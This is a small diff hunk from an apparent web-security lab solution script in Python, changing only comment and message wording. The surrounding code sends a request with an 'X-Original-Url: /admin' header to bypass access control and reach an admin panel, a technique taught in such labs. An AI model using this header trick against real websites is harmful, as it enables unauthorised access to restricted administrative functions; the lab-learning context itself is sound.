@@ -30,13 +30,13 @@ try:
     # set header
     headers = {"X-Original-Url": "/admin"}
     
-    # fetch admin panel
+    # fetch the admin panel
     # this step is not necessary in the script, you can do step 2 directrly
     # it's a must only when solving the lab using the browser
     admin_panel = requests.get(url, headers=headers)
 
 except:
-    print(Fore.RED + "[!] Failed to fetch admin panel through exception")
+    print(Fore.RED + "[!] Failed to fetch the admin panel through exception")
     exit(1)
     
 print(Fore.WHITE + "1. Fetching admin panel.. " + Fore.GREEN + "OK")
